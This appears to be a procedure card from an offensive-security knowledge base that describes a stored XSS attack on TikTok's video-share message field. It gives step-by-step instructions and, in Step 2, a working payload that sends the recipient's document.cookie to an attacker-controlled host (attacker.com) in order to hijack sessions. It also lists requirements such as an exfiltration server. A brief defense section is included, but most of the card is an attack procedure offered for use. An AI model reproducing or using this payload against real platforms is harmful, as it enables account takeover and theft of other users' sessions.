---
tags:
  - xss
  - stored-xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 7c429753-4062-4672-b9a2-34fd4c1f4da3
created_at: '2025-12-13T23:52:39.456Z'
updated_at: '2025-12-13T23:52:39.456Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-in-Video-Share-Text

## Summary

This procedure exploits insufficient input sanitization in TikTok's video sharing text field to inject a stored XSS payload, which is persisted server-side and delivered to recipients.

## Description

In the context of TikTok's web platform, the text field for accompanying messages when sharing videos to friends lacks proper escaping, allowing attackers to inject JavaScript. The payload is stored with the video share and rendered unsafely when the recipient views it, executing in their browser. This enables client-side attacks like stealing session tokens for hijacking. Prerequisites include a valid TikTok account and the ability to send videos to targets. Expected outcomes include successful payload storage without sender-side execution, setting up persistent attacks.

## Requirements

1. Authenticated TikTok account with friend connections
2. Web browser for accessing TikTok interface
3. Attacker-controlled server for payload exfiltration (e.g., to receive stolen cookies)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., HTML entity encoding) for all user-supplied text in messages
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript network requests from client-side

## Objectives

1. Inject and store malicious JavaScript in the shared video message
2. Ensure payload persistence for delivery to recipients
3. Prepare for client-side execution leading to session compromise

## Instructions

### Step 1: Access Video Sharing Interface

**Context**: Log in to TikTok and navigate to a video to share, accessing the text field for the message.

Open TikTok in a web browser, search for or select a video, and click the share button to send to a friend. Locate the text input field for the accompanying message.

### Step 2: Craft and Inject Payload

**Context**: Append a JavaScript payload to the message text to test or exploit the vulnerability.

Enter a payload such as `<script>alert('XSS Test')</script>` for verification, or an exploitative one like `<script>var img = new Image(); img.src = 'https://attacker.com/log?data=' + encodeURIComponent(document.cookie);</script>` to exfiltrate cookies. Submit the share.

> This step relies on the lack of sanitization; if successful, no errors occur, and the video sends.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored by checking share history or attempting to view as sender (non-executing).

Review sent messages in TikTok; the raw payload should appear in the text without execution on your side.

> Expected: Payload visible in stored message, confirming persistence.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[tiktok]]
